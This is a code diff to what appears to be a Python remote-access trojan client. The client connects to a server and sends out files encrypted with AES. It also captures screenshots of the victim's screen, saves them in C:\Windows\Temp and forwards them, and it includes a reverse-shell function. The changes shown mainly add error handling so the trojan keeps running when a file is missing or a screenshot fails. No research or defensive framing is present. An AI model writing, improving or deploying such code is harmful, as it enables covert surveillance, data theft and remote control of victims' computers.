@@ -2,7 +2,7 @@
 
 import socket,time
 import platform
-import getpass
+import getpass,os
 import subprocess, threading
 from Crypto.Cipher import AES
 
@@ -30,16 +30,20 @@ print("[+] Connected to server")
 
 def download(file_path):
     # file_path_ = s.recv(4096).decode()
-    file = open(file_path, 'rb')
-    a = file.read(4096)
-    a = ciper.encrypt(a)
-    while a:
-        s.send(a)
+    try:
+        file = open(file_path, 'rb')
         a = file.read(4096)
         a = ciper.encrypt(a)
-    time.sleep(1)
-    s.send(ciper.encrypt(b"\n\r"))
-    file.close()
+        while a:
+            s.send(a)
+            a = file.read(4096)
+            a = ciper.encrypt(a)
+        time.sleep(1)
+        s.send(ciper.encrypt(b"\n\r"))
+        file.close()
+    except FileNotFoundError:
+        pass
+        
 
 def upload():
     path = s.recv(4096).decode()
@@ -94,18 +98,22 @@ def rev_shell(socket):
 
 def ss():
     import pyautogui
-    my_screenshot = pyautogui.screenshot()
-    file_name = "screenshoot_" + time.ctime().split()[3].replace(':', '-') + '.png'
+    from pyautogui import PyAutoGUIException
+    try:
+        my_screenshot = pyautogui.screenshot()
+        file_name = "screenshoot_" + time.ctime().split()[3].replace(':', '-') + '.png'
 
-    path = "C:\\Windows\\Temp\\" + file_name
+        path = "C:\\Windows\\Temp\\" + file_name
 
-    my_screenshot.save(path)
-    time.sleep(2)
-    
-    s.send(path.encode())
-    print("PATH SENT!")
+        my_screenshot.save(path)
+        time.sleep(2)
+        
+        s.send(path.encode())
+        print("PATH SENT!")
 
-    download(file_path=path)
+        download(file_path=path)
+    except PyAutoGUIException:
+        s.send(b"\nUnable to take screenshoot")
 
 
 while 1:
